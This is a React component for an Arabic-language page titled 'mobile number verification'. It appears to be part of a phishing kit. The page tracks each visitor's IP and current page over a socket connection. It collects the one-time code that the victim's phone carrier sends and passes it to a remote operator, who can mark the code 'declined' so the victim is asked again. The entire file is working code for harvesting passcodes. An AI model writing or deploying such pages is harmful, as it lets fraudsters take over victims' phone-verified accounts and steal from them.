import React, { useEffect, useState } from "react";
import { socket } from "../App";


export default function PhoneCode() {
  const [ip, setIp] = useState(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorVisible, setErrorVisible] = useState(false);

  useEffect(() => {
    // Fetch IP and notify server
    const fetchIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        setIp(ip);
        socket.emit("updateLocation", { ip, page: "phonecode" });
      } catch (e) {
        console.error("IP fetch failed:", e);
      }
    };

    fetchIP();

    // Show decline error if query string contains ?declined=true
    if (
      new URLSearchParams(window.location.search).get("declined") === "true"
    ) {
      setErrorVisible(true);
    }

    // Listen to ackPhoneCode response
    socket.on("ackPhoneCode", (resp) => {
      if (resp.success) {
        // Do nothing, location.js will handle navigation
      } else {
        setLoading(false);
        setErrorVisible(true);
        console.error(resp.error);
      }
    });

    return () => {
      socket.off("ackPhoneCode");
    };
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    if (!ip) return;

    socket.emit("submitPhoneCode", {
      ip,
      verification_code_three: code,
    });
  };

  return (
    <div
      dir="rtl"
      className="font-['Readex_Pro'] min-h-screen bg-gray-100 flex items-center justify-center px-4"
    >
      <div className="w-full max-w-md">
        <div className="bg-white rounded-xl shadow p-6">
          <div className="mb-5 text-left">
            <img src="/cstr.png" alt="Logo" width="250px" />
          </div>
          <h5 className="text-xl font-semibold text-center mb-3">
            التحقق من رقم الجوال
          </h5>
          <p className="text-sm text-right text-gray-600 mb-4 leading-6">
            يرجى إدخال الرمز المرسل إليك من قِبل شركة الاتصالات الخاصة بك، وذلك
            لاستكمال عملية التحقق والتأكيد من ملكية رقم الجوال المُسجّل.
          </p>
          <form onSubmit={handleSubmit}>
            <div className="form-group mb-4 text-right">
              <label
                htmlFor="verification_code_three"
                className="text-sm text-gray-700 block mb-1"
              >
                أدخل الرمز هنا :
              </label>
              <input
                id="verification_code_three"
                type="tel"
                className="form-control text-center border px-4 py-2 w-full rounded"
                minLength="4"
                maxLength="6"
                pattern="^(?:\d{4}|\d{6})$"
                title="يجب إدخال 4 أو 6 أرقام فقط"
                value={code}
                onChange={(e) =>
                  setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
                }
                required
              />
              {errorVisible && (
                <div className="alert alert-danger mt-3 text-right text-red-600 text-sm">
                  الرمز المدخل غير صحيح.
                </div>
              )}
            </div>
            <button
              type="submit"
              className="btn btn-primary w-full bg-blue-600 text-white py-2 rounded"
            >
              تأكيد
            </button>
            <p className="text-xs text-right text-gray-500 mt-3">
              هل تحتاج للمساعدة ؟
            </p>
          </form>
        </div>

        {/* Loading Overlay */}
        {loading && (
          <div className="fixed inset-0 bg-black bg-opacity-60 flex justify-center items-center z-50">
            <div className="text-center text-white">
              <div className="spinner-border text-light mb-3 animate-spin rounded-full h-12 w-12 border-t-2 border-white"></div>
              <h5 className="font-bold">يرجى الانتظار</h5>
              <p>انتظر حتى تتم معالجة طلبك</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
